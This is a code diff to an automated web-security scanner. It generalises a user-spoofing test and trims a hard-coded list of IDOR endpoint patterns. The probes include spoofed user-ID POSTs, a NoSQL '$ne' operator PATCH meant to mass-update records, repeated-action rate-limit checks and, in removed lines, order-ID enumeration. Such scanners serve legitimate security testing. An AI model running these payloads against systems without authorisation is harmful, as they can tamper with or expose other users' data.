@@ -240,20 +240,6 @@ async def test_idor_comprehensive(
             "/rest/items/{id}",
             "/users/{id}",  # Simple patterns
             "/items/{id}",
-            "/rest/basket/{id}",        # Shopping basket access
-            "/api/BasketItems/{id}",    # Basket items
-            "/api/Feedbacks/{id}",      # Feedback/reviews
-            "/api/Complaints/{id}",     # Complaint records
-            "/api/Recycles/{id}",       # Recycle data
-            "/api/Addresss/{id}",       # Address records (note: typo-inclusive)
-            "/api/Addresses/{id}",      # Address records
-            "/api/Cards/{id}",          # Payment cards
-            "/api/Products/{id}",       # Product details
-            "/api/Quantitys/{id}",      # Quantity records
-            "/api/SecurityQuestions/{id}", # Security questions
-            "/rest/products/{id}/reviews", # Product reviews
-            "/api/Deliverys/{id}",      # Delivery records
-            "/api/Wallets/{id}",        # Wallet data
         ]
     else:
         idor_patterns = endpoint_patterns
@@ -322,20 +308,27 @@ async def test_idor_comprehensive(
         return {"status": "error", "message": f"IDOR testing failed: {e}"}
 
 
-async def test_user_spoofing(url: str, auth_session: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
+async def test_user_spoofing(url: str, auth_session: Optional[Dict[str, Any]] = None, endpoints: Optional[List[str]] = None) -> Dict[str, Any]:
     """
     Test for user spoofing vulnerabilities — posting content as another user.
 
-    Tests:
-    - Feedback submission with manipulated UserId
-    - Review posting/updating with different author
-    - NoSQL operator injection in review updates (mass update)
-    - Order status manipulation via IDOR
+    Tests each provided endpoint for:
+    - POST with manipulated user ID fields (UserId, user_id, userId, author_id)
+    - PATCH with NoSQL operator injection ($ne) for mass update
+    - Repeated POST/like actions to detect missing rate limiting
+
+    If no endpoints are provided, tests the url directly.
 
     OWASP Reference: WSTG-ATHZ-02, WSTG-ATHZ-03
+
+    Args:
+        url: Target URL (used as base URL to resolve relative endpoints, or tested directly if no endpoints given)
+        auth_session: Optional authenticated session (cookies/headers/token)
+        endpoints: Optional list of endpoint paths to test (e.g., ["/api/feedback", "/api/reviews"]).
+                   Can be absolute URLs or relative paths (resolved against url's origin).
     """
     findings = []
-    from urllib.parse import urlparse
+    from urllib.parse import urlparse, urljoin
     parsed = urlparse(url)
     base_url = f"{parsed.scheme}://{parsed.netloc}"
 
@@ -350,117 +343,98 @@ async def test_user_spoofing(url: str, auth_session: Optional[Dict[str, Any]] = 
             headers['Authorization'] = f"Bearer {auth_session['token']}"
     req_kwargs['headers'] = headers
 
+    # Resolve endpoint list: use provided endpoints, or fall back to the url itself
+    if endpoints:
+        resolved_endpoints = []
+        for ep in endpoints:
+            if ep.startswith("http://") or ep.startswith("https://"):
+                resolved_endpoints.append(ep)
+            else:
+                resolved_endpoints.append(base_url.rstrip('/') + '/' + ep.lstrip('/'))
+    else:
+        resolved_endpoints = [url]
+
     async with httpx.AsyncClient(**req_kwargs) as client:
 
-        # Test 1: Feedback with spoofed UserId
-        feedback_url = f"{base_url}/api/Feedbacks/"
-        spoofed_user_ids = [1, 2, 3]  # Try admin (1) and other users
-        for uid in spoofed_user_ids:
+        for endpoint_url in resolved_endpoints:
+            # Test 1: POST with spoofed user ID fields
+            spoofed_user_ids = [1, 2, 3]
+            user_id_fields = ["UserId", "user_id", "userId", "author_id"]
+            for uid in spoofed_user_ids:
+                for id_field in user_id_fields:
+                    try:
+                        payload = {
+                            id_field: uid,
+                            "comment": "Spoofing test (automated security scan)",
+                            "rating": 3,
+                        }
+                        resp = await client.post(endpoint_url, json=payload)
+                        if resp.status_code in (200, 201):
+                            resp_data = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
+                            data = resp_data.get("data", resp_data)
+                            actual_uid = data.get(id_field) if isinstance(data, dict) else None
+                            if actual_uid == uid:
+                                findings.append({
+                                    "type": "user_spoofing",
+                                    "severity": "high",
+                                    "description": f"Content posted as {id_field}={uid} (different from authenticated user)",
+                                    "endpoint": endpoint_url,
+                                    "evidence": str(resp_data)[:300],
+                                    "recommendation": f"Enforce server-side {id_field} from session, ignore client-sent value",
+                                })
+                                break  # One proof per uid is enough
+                    except Exception:
+                        continue
+
+            # Test 2: PATCH with NoSQL operator injection for mass update
             try:
-                resp = await client.post(feedback_url, json={
-                    "UserId": uid,
-                    "captchaId": 0,
-                    "captcha": "0",
-                    "comment": "Spoofing test (automated security scan)",
-                    "rating": 3,
+                resp = await client.patch(endpoint_url, json={
+                    "id": {"$ne": -1},
+                    "message": "NoSQL mass update test",
                 })
-                if resp.status_code in (200, 201):
-                    resp_data = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
-                    data = resp_data.get("data", resp_data)
-                    actual_uid = data.get("UserId") if isinstance(data, dict) else None
-                    if actual_uid == uid:
+                if resp.status_code == 200:
+                    resp_data = {}
+                    try:
+                        resp_data = resp.json()
+                    except Exception:
+                        pass
+                    modified = resp_data.get("modified", resp_data.get("modifiedCount", 0))
+                    if isinstance(modified, int) and modified > 1:
                         findings.append({
-                            "type": "feedback_user_spoofing",
-                            "severity": "high",
-                            "description": f"Feedback posted as UserId={uid} (different from authenticated user)",
-                            "endpoint": feedback_url,
+                            "type": "nosql_mass_update",
+                            "severity": "critical",
+                            "description": f"NoSQL injection: mass update affected {modified} records",
+                            "endpoint": endpoint_url,
                             "evidence": str(resp_data)[:300],
-                            "recommendation": "Enforce server-side UserId from session, ignore client-sent UserId",
+                        })
+                    elif resp.status_code == 200:
+                        findings.append({
+                            "type": "nosql_operator_accepted",
+                            "severity": "high",
+                            "description": "Endpoint accepted NoSQL operator ($ne) in id field",
+                            "endpoint": endpoint_url,
+                            "evidence": resp.text[:300],
                         })
             except Exception:
-                continue
+                pass
 
-        # Test 2: Update ALL reviews via NoSQL operator injection
-        review_url = f"{base_url}/rest/products/reviews"
-        try:
-            resp = await client.patch(review_url, json={
-                "id": {"$ne": -1},
-                "message": "NoSQL mass update test",
-            })
-            if resp.status_code == 200:
-                resp_data = {}
+            # Test 3: Repeated action to detect missing rate limiting
+            like_count = 0
+            for _ in range(5):
                 try:
-                    resp_data = resp.json()
+                    resp = await client.post(endpoint_url)
+                    if resp.status_code == 200:
+                        like_count += 1
                 except Exception:
-                    pass
-                # If response indicates multiple records affected
-                modified = resp_data.get("modified", resp_data.get("modifiedCount", 0))
-                if isinstance(modified, int) and modified > 1:
-                    findings.append({
-                        "type": "nosql_mass_update",
-                        "severity": "critical",
-                        "description": f"NoSQL injection: mass update affected {modified} reviews",
-                        "endpoint": review_url,
-                        "evidence": str(resp_data)[:300],
-                    })
-                elif resp.status_code == 200:
-                    findings.append({
-                        "type": "nosql_operator_accepted",
-                        "severity": "high",
-                        "description": "Review endpoint accepted NoSQL operator ($ne) in id field",
-                        "endpoint": review_url,
-                        "evidence": resp.text[:300],
-                    })
-        except Exception:
-            pass
-
-        # Test 3: Like a review multiple times
-        # First get a review
-        try:
-            products_resp = await client.get(f"{base_url}/rest/products/1/reviews")
-            if products_resp.status_code == 200:
-                reviews = products_resp.json() if products_resp.headers.get("content-type", "").startswith("application/json") else []
-                if isinstance(reviews, dict):
-                    reviews = reviews.get("data", [])
-                if isinstance(reviews, list) and len(reviews) > 0:
-                    review_id = reviews[0].get("_id") or reviews[0].get("id")
-                    if review_id:
-                        like_url = f"{base_url}/rest/products/reviews"
-                        like_count = 0
-                        for _ in range(5):
-                            try:
-                                like_resp = await client.post(f"{like_url}/{review_id}/likes" if review_id else like_url)
-                                if like_resp.status_code == 200:
-                                    like_count += 1
-                            except Exception:
-                                break
-                        if like_count >= 3:
-                            findings.append({
-                                "type": "multiple_likes",
-                                "severity": "medium",
-                                "description": f"Same user could like review {like_count} times (no rate limiting)",
-                                "endpoint": f"{like_url}/{review_id}/likes",
-                                "recommendation": "Enforce one-like-per-user constraint",
-                            })
-        except Exception:
-            pass
-
-        # Test 4: Access other users' orders
-        for order_id in range(1, 6):
-            try:
-                order_url = f"{base_url}/rest/track-order/{order_id}"
-                resp = await client.get(order_url)
-                if resp.status_code == 200 and len(resp.text) > 50:
-                    findings.append({
-                        "type": "order_idor",
-                        "severity": "medium",
-                        "description": f"Order #{order_id} accessible without authorization",
-                        "endpoint": order_url,
-                        "evidence": resp.text[:200],
-                    })
-                    break  # One is enough to prove the issue
-            except Exception:
-                continue
+                    break
+            if like_count >= 3:
+                findings.append({
+                    "type": "missing_rate_limit",
+                    "severity": "medium",
+                    "description": f"Same action succeeded {like_count} times without rate limiting",
+                    "endpoint": endpoint_url,
+                    "recommendation": "Enforce rate limiting or one-action-per-user constraint",
+                })
 
     return {
         "status": "success",
